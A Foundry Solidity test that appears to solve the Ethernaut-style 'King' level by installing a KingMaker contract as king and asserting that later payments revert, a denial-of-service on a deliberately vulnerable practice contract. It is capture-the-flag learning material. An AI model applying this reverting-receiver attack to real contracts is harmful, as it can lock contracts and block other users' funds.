// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel09.sol";
import "../src/level09.sol";

contract Attacker is Test {
    King level09 = King(payable(0x9BED8AD934C870b0a0ebbf882349631f19468cB8));

    function test() external {
        uint256 prize = level09.prize();

        vm.deal(address(this), 2 * prize);
        KingMaker kingMaker = (new KingMaker){value: prize}(address(level09));

        (bool success,) = address(level09).call{value: prize}("");
        assert(!success);

        assertEq(level09._king(), address(kingMaker));
    }
}
